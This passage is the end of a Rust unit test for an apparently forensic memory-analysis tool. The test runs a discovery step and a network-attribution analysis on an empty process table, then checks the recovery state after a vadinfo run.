        case.document.runs.pop();
        case.queue_batch(first).unwrap();
        let discovery = case.document.runs[case.document.runs.len() - 2].id.clone();
        case.finish(
            &discovery,
            &Outcome {
                status: RunStatus::Completed,
                exit_code: Some(0),
                message: String::new(),
                table: Some(Table::parse("[]").unwrap()),
            },
        )
        .unwrap();
        let second = crate::analyses::prepare_network_attribution(
            &case,
            &engine,
            case.document.runs.last().unwrap(),
        )
        .unwrap();
        assert_eq!(second.len(), 1);
        assert_eq!(second[0].id, id);
        assert_ne!(second[0].message, PENDING);
        *case.document.runs.last_mut().unwrap() = second[0].clone();
        let (table, message) = analyze(
            &case.directory,
            &case.document,
            &second[0],
            &AtomicBool::new(false),
            &|_| {},
        )
        .unwrap();
        assert!(table.rows.is_empty());
        assert!(message.contains("0 processes scanned"));
        case.finish(
            &id,
            &Outcome {
                status: RunStatus::Completed,
                exit_code: Some(0),
                message,
                table: Some(table),
            },
        )
        .unwrap();
        assert!(!needs_recovery(&case.document, &evidence.id));
        completed(
            &mut case,
            &evidence,
            VADINFO,
            vec!["--pid".into(), "42".into()],
            json!([]),
        );
        assert!(needs_recovery(&case.document, &evidence.id));
    }
}
